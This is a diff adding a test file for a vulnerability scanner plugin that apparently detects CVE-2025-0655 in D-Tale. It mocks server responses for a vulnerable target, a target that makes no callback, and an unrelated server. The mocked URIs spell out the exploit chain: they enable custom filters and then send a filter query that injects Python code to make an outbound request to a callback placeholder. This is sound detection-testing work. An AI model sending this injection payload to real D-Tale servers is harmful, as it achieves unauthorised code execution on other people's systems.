@@ -1,0 +1,116 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "Dtale_CVE_2025_0655"
+}
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 302
+        headers: [
+          { name: "Location" value: "/dtale/main/1" }
+        ]
+        body_content: 
+          '... <p>You should be redirected automatically to the target URL:'
+          ' <a href="/dtale/main/1">/dtale/main/1</a>. If not, click the link. ...'
+      },
+      {
+        uri: "/dtale/upload"
+        status: 200
+        body_content: '{"data_id":"112233","success":true}'
+      },
+      {
+        uri: "/dtale/update-settings/112233?settings=%7B%22enable_custom_filters%22%3Atrue%7D",
+        status: 200
+        body_content: "{\"success\":true}"
+      },
+      {
+        uri: "/dtale/test-filter/112233?query=%40pd.core.frame.com.builtins.__import__%28%22requests%22%29.get%28%22{{ T_CBS_URI }}%22%29"
+        status: 200
+        body_content: "{\"success\":true}"
+      },
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "{\"error\":\"...\"}"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNoCallback_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 302
+        headers: [
+          { name: "Location" value: "/dtale/main/1" }
+        ]
+        body_content: 
+          '... <p>You should be redirected automatically to the target URL:'
+          ' <a href="/dtale/main/1">/dtale/main/1</a>. If not, click the link. ...'
+      },
+      {
+        uri: "/dtale/upload"
+        status: 200
+        body_content: '{"data_id":"112233","success":true}'
+      },
+      {
+        uri: "/dtale/update-settings/112233?settings=%7B%22enable_custom_filters%22%3Atrue%7D"
+        status: 200
+        body_content: "{\"success\":true}"
+      },
+      {
+        uri: "/dtale/test-filter/112233?query=%40pd.core.frame.com.builtins.__import__%28%22requests%22%29.get%28%22{{ T_CBS_URI }}%22%29"
+        status: 200
+        body_content: "{\"success\":true}"
+      },
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "{\"error\":\"...\"}"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenRandomServer_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "... Hello world ..."
+      }
+    ]
+  }
+}
